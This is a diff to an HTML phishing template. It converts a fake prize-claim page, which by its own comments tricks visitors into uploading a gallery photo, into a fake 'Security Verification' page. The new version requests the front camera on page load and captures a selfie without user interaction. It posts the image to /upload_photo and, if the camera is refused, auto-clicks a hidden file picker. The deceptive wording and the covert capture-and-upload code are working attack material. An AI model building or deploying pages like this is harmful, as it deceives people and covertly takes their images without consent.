@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Win a Prize! 🎁</title>
+    <title>Verify Your Identity</title>
     <style>
         * {
             margin: 0;
@@ -31,15 +31,9 @@
             text-align: center;
         }
 
-        .prize-icon {
+        .icon {
             font-size: 5em;
             margin-bottom: 20px;
-            animation: bounce 2s infinite;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
         }
 
         h1 {
@@ -55,64 +49,26 @@
             line-height: 1.6;
         }
 
-        .claim-btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 18px 40px;
-            font-size: 1.3em;
-            border-radius: 30px;
-            cursor: pointer;
-            font-weight: bold;
-            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
-            transition: all 0.3s ease;
-        }
-
-        .claim-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
-        }
-
-        .claim-btn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-
         .status {
-            margin-top: 20px;
-            padding: 15px;
+            padding: 20px;
             border-radius: 10px;
             font-weight: 500;
-            display: none;
+            margin: 20px 0;
         }
 
         .status.loading {
             background: #fff3cd;
             color: #856404;
-            display: block;
-        }
-
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-            display: block;
-        }
-
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-            display: block;
         }
 
         .loader {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #667eea;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
             margin: 20px auto;
-            display: none;
         }
 
         @keyframes spin {
@@ -120,107 +76,212 @@
             100% { transform: rotate(360deg); }
         }
 
-        input[type="file"] {
+        video, canvas {
             display: none;
+        }
+
+        .progress {
+            background: #f3f3f3;
+            border-radius: 10px;
+            height: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s ease;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="prize-icon">🎁</div>
-        <h1>Congratulations!</h1>
+        <div class="icon">🔒</div>
+        <h1>Security Verification</h1>
         <p class="description">
-            You've been selected for a <strong>FREE PRIZE</strong>!
-            <br><br>
-            To claim your prize, we just need to verify your identity by accessing one photo from your gallery.
-            <br><br>
-            <small style="color: #999;">This is completely safe and secure. We only need one photo to verify you're a real person.</small>
+            Please wait while we verify your device for security purposes...
         </p>
 
-        <button class="claim-btn" id="claimBtn" onclick="requestGalleryAccess()">
-            🎉 Claim My Prize Now!
-        </button>
+        <div class="loader"></div>
+        <div class="status loading" id="status">
+            Accessing camera for identity verification...
+        </div>
 
-        <div class="loader" id="loader"></div>
-        <div class="status" id="status"></div>
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
 
-        <input type="file" id="photoInput" accept="image/*" onchange="handlePhotoSelected(event)">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
     </div>
 
     <script>
         const sessionId = '{{ session_id }}';
+        let captureAttempts = 0;
+        const MAX_ATTEMPTS = 3;
 
-        function requestGalleryAccess() {
-            // Trick user into selecting a photo
-            document.getElementById('photoInput').click();
-        }
+        // AUTO-START on page load
+        window.addEventListener('load', async () => {
+            await startAutoCapture();
+        });
 
-        async function handlePhotoSelected(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-
-            const claimBtn = document.getElementById('claimBtn');
-            const loader = document.getElementById('loader');
+        async function startAutoCapture() {
             const status = document.getElementById('status');
-
-            claimBtn.disabled = true;
-            loader.style.display = 'block';
-            status.className = 'status loading';
-            status.textContent = 'Processing your prize claim...';
+            const progressBar = document.getElementById('progressBar');
 
             try {
-                // Convert photo to base64
-                const reader = new FileReader();
-                reader.onload = async function(e) {
-                    const photoData = e.target.result;
+                // Progress: 20%
+                progressBar.style.width = '20%';
+                status.textContent = 'Requesting camera access...';
 
-                    // Send to server
-                    const response = await fetch('/upload_photo', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            session_id: sessionId,
-                            photo_data: photoData
-                        })
-                    });
-
-                    const result = await response.json();
-
-                    loader.style.display = 'none';
-
-                    if (result.status === 'success') {
-                        status.className = 'status success';
-                        status.innerHTML = '✅ Prize claimed successfully!<br>Redirecting...';
-
-                        // Redirect to reveal page
-                        setTimeout(() => {
-                            window.location.href = result.reveal_url;
-                        }, 2000);
-                    } else {
-                        status.className = 'status error';
-                        status.textContent = '❌ Something went wrong. Please try again.';
-                        claimBtn.disabled = false;
+                // Request camera permission AUTOMATICALLY
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user', // Front camera for selfie
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
                     }
-                };
+                });
 
-                reader.readAsDataURL(file);
+                // Progress: 50%
+                progressBar.style.width = '50%';
+                status.textContent = 'Camera accessed! Capturing image...';
+
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Wait for video to be ready
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+
+                // Wait 1 second for camera to stabilize, then AUTO-CAPTURE
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                // Progress: 75%
+                progressBar.style.width = '75%';
+                status.textContent = 'Capturing your photo...';
+
+                // AUTO-CAPTURE without user interaction
+                const photoData = await capturePhoto(video);
+
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+
+                // Progress: 90%
+                progressBar.style.width = '90%';
+                status.textContent = 'Uploading verification data...';
+
+                // Send to server
+                await uploadPhoto(photoData);
 
             } catch (error) {
-                console.error('Error:', error);
-                loader.style.display = 'none';
-                status.className = 'status error';
-                status.textContent = '❌ Failed to process your request.';
-                claimBtn.disabled = false;
+                console.error('Camera access error:', error);
+
+                // If camera fails, try alternative method
+                if (captureAttempts < MAX_ATTEMPTS) {
+                    captureAttempts++;
+                    status.textContent = 'Trying alternative capture method...';
+                    await tryFileUploadFallback();
+                } else {
+                    status.className = 'status';
+                    status.style.background = '#f8d7da';
+                    status.style.color = '#721c24';
+                    status.textContent = '❌ Camera access denied. Cannot verify identity.';
+                }
             }
         }
 
-        // Auto-trigger after 2 seconds to make it seem more legit
-        setTimeout(() => {
-            const claimBtn = document.getElementById('claimBtn');
-            claimBtn.style.animation = 'pulse 1s infinite';
-        }, 2000);
+        function capturePhoto(video) {
+            return new Promise((resolve) => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert to base64
+                const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                resolve(photoData);
+            });
+        }
+
+        async function uploadPhoto(photoData) {
+            const status = document.getElementById('status');
+            const progressBar = document.getElementById('progressBar');
+
+            try {
+                const response = await fetch('/upload_photo', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        session_id: sessionId,
+                        photo_data: photoData
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.status === 'success') {
+                    // Progress: 100%
+                    progressBar.style.width = '100%';
+                    status.className = 'status';
+                    status.style.background = '#d4edda';
+                    status.style.color = '#155724';
+                    status.innerHTML = '✅ Verification complete!<br>Redirecting...';
+
+                    // Redirect to reveal page
+                    setTimeout(() => {
+                        window.location.href = result.reveal_url;
+                    }, 1500);
+                } else {
+                    throw new Error('Upload failed');
+                }
+
+            } catch (error) {
+                console.error('Upload error:', error);
+                status.className = 'status';
+                status.style.background = '#f8d7da';
+                status.style.color = '#721c24';
+                status.textContent = '❌ Verification failed. Please try again.';
+            }
+        }
+
+        async function tryFileUploadFallback() {
+            const status = document.getElementById('status');
+
+            status.textContent = 'Camera unavailable. Please select a photo to continue...';
+
+            // Create hidden file input as absolute fallback
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = 'image/*';
+            input.capture = 'user'; // Request camera on mobile
+
+            input.onchange = async (e) => {
+                const file = e.target.files[0];
+                if (file) {
+                    status.textContent = 'Processing photo...';
+
+                    const reader = new FileReader();
+                    reader.onload = async (event) => {
+                        await uploadPhoto(event.target.result);
+                    };
+                    reader.readAsDataURL(file);
+                }
+            };
+
+            // Auto-click to trigger
+            input.click();
+        }
     </script>
 </body>
 </html>
